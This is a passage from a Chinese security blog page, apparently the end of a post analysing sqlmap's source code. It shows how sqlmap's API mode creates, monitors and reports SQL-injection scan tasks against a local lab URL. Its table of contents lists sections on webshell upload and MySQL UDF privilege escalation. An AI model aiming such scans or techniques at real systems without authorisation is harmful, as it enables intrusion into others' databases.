+<p>他的这些数据存储到 内存中 日志存储到sqlite3中  </p>
+<h3 id="api形式如何执行测试"><a href="#api形式如何执行测试" class="headerlink" title="api形式如何执行测试"></a>api形式如何执行测试</h3><p>每个任务最终的调用当时 是开个进程去执行  <code>[&quot;python&quot;, &quot;sqlmap.py&quot;, &quot;--api&quot;, &quot;-c&quot;, configFile]</code>  </p>
+<p>接口请求控制去开启这个任务  </p>
+<p>使用这个接口来操作 </p>
+<h3 id="使用sqlmapapi-c-客户端模式进行测试"><a href="#使用sqlmapapi-c-客户端模式进行测试" class="headerlink" title="使用sqlmapapi -c 客户端模式进行测试"></a>使用sqlmapapi -c 客户端模式进行测试</h3><p>这里使用 pythonapi的客户端模块来创建任务 </p>
+<ol>
+<li>创建一个任务<br><code>new -u &quot;http://192.168.19.128:8081/Less-1/?id=1&quot;</code>  </li>
+</ol>
+<p><img src="/2021/06/11/sqlmap源码分析下/api%E5%88%9B%E5%BB%BA%E4%BB%BB%E5%8A%A1.jpg" alt="api创建任务">  </p>
+<ol start="2">
+<li>查看扫描状态  </li>
+</ol>
+<p><img src="/2021/06/11/sqlmap源码分析下/%E6%89%AB%E6%8F%8F%E7%8A%B6%E6%80%81.jpg" alt="扫描状态">  </p>
+<ol start="3">
+<li>获取注入结果  </li>
+</ol>
+<p><img src="/2021/06/11/sqlmap源码分析下/%E6%B3%A8%E5%85%A5%E7%BB%93%E6%9E%9C.jpg" alt="注入结果">  </p>
+<ol start="4">
+<li>就是说类似 AWVS的那种有web api的形式可以直接调用任务这样使用  </li>
+</ol>
+<h3 id="sqlmap-api的利用"><a href="#sqlmap-api的利用" class="headerlink" title="sqlmap api的利用"></a>sqlmap api的利用</h3><p>这里本来打算做个扫描平台那种 sqlmap只作为一种检测引擎<br>这里可以 通过对url去重 过滤等操作后 下发到节点进行操作  </p>
+<p>可以每个机器上都有个sqlmap 然后每次下发任务celery 直接请求本机端口 再次判断这个任务这样就可以了  </p>
+
+      
+    </div>
+
+    
+
+    
+      
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/12/30/gitlab与jenkins配置ci/" rel="next" title="gitlab与jenkins配置ci">
+                <i class="fa fa-chevron-left"></i> gitlab与jenkins配置ci
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+  </div>
+
+
+          </div>
+          
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  
+    <img class="site-author-image" itemprop="image" src="/images/avatar.jpg" alt="Recar">
+  
+  <p class="site-author-name" itemprop="name">Recar</p>
+  <div class="site-description motion-element" itemprop="description">年轻人就应该多读源码多读书</div>
+</div>
+
+
+  <nav class="site-state motion-element">
+    
+      <div class="site-state-item site-state-posts">
+        
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">18</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+    
+
+    
+
+    
+      
+      
+      <div class="site-state-item site-state-tags">
+        
+        
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">标签</span>
+        
+      </div>
+    
+  </nav>
+
+
+
+
+
+
+
+
+
+
+
+
+
+          
+          
+        </div>
+      </div>
+
+      
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#sqlmap源码分析下"><span class="nav-number">1.</span> <span class="nav-text">sqlmap源码分析下</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#补充联合查询一个点"><span class="nav-number">1.1.</span> <span class="nav-text">补充联合查询一个点</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#验证成功后获取数据"><span class="nav-number">1.1.1.</span> <span class="nav-text">验证成功后获取数据</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#–os-shell"><span class="nav-number">1.2.</span> <span class="nav-text">–os-shell</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#initENV"><span class="nav-number">1.2.0.1.</span> <span class="nav-text">initENV</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#webInit"><span class="nav-number">1.2.0.2.</span> <span class="nav-text">webInit</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#webFileInject-上传小马文件"><span class="nav-number">1.2.0.3.</span> <span class="nav-text">_webFileInject 上传小马文件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#加载大小马-写入-最后获取-获取shell"><span class="nav-number">1.2.0.4.</span> <span class="nav-text">加载大小马  写入 最后获取 获取shell</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#对于mysql导出文件"><span class="nav-number">1.3.</span> <span class="nav-text">对于mysql导出文件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#d-直连数据库提权"><span class="nav-number">1.4.</span> <span class="nav-text">-d 直连数据库提权</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#mysql-udf提权"><span class="nav-number">1.4.0.1.</span> <span class="nav-text">mysql udf提权</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#上传-udf的代码"><span class="nav-number">1.4.0.2.</span> <span class="nav-text">上传 udf的代码</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#需要的条件"><span class="nav-number">1.4.1.</span> <span class="nav-text">需要的条件</span></a></li></ol><li class="nav-item nav-level-2"><a class="nav-link" href="#sqlmap-api"><span class="nav-number">1.5.</span> <span class="nav-text">sqlmap api</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#server"><span class="nav-number">1.5.1.</span> <span class="nav-text">server</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#run"><span class="nav-number">1.5.2.</span> <span class="nav-text">run</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#api形式如何执行测试"><span class="nav-number">1.5.3.</span> <span class="nav-text">api形式如何执行测试</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#使用sqlmapapi-c-客户端模式进行测试"><span class="nav-number">1.5.4.</span> <span class="nav-text">使用sqlmapapi -c 客户端模式进行测试</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sqlmap-api的利用"><span class="nav-number">1.5.5.</span> <span class="nav-text">sqlmap api的利用</span></a></li></ol></li></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Recar</span>
+
+  
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> 强力驱动 v3.9.0</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> v7.2.0</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    
+
+    
+
+    
+
+  </div>
+
+  
+
+<script>
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+
+
+
+
+
+
+
+
+
+  
+  <script src="/lib/jquery/index.js?v=3.4.1"></script>
+
+  
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+
+
+
+  <script src="/js/utils.js?v=7.2.0"></script>
+
+  <script src="/js/motion.js?v=7.2.0"></script>
+
+
+
+  
+  
+
+
+  <script src="/js/affix.js?v=7.2.0"></script>
+
+  <script src="/js/schemes/pisces.js?v=7.2.0"></script>
+
+
+
+
+  
+  <script src="/js/scrollspy.js?v=7.2.0"></script>
+<script src="/js/post-details.js?v=7.2.0"></script>
+
+
+
+  <script src="/js/next-boot.js?v=7.2.0"></script>
+
+  
+
+  
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script>
+// GET RESPONSIVE HEIGHT PASSED FROM IFRAME
+
+window.addEventListener("message", function(e) {
+  var data = e.data;
+  if ((typeof data === 'string') && (data.indexOf('ciu_embed') > -1)) {
+    var featureID = data.split(':')[1];
+    var height = data.split(':')[2];
+    $(`iframe[data-feature=${featureID}]`).height(parseInt(height) + 30);
+  }
+}, false);
+</script>
+
+
+
+
+
+
+
+
+  
+
+</body>
+</html>
